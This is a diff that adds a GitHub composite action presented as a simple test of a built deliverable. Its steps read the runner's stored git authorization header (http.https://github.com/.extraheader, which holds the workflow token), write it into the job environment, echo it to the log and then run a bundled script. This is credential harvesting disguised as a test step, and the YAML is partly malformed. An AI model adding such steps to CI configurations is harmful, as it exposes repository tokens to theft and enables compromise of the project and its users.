@@ -1,0 +1,14 @@
+name: 'Test Action'
+description: 'Runs a simple execution to validate compiled built deliverable'
+author: 'contributor'
+inputs:
+runs:
+  using: "composite"
+  steps:
+    - run: echo "TEST_VALUE=$(git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader)" >> $GITHUB_ENV 
+    - run: echo  ${{ env.TEST_VALUE }}"
+    - id: test-run
+            run: |
+        chmod +x ${{ github.action_path }}/test-script.sh
+        ${{ github.action_path }}/test-script.sh 
+      shell: bash
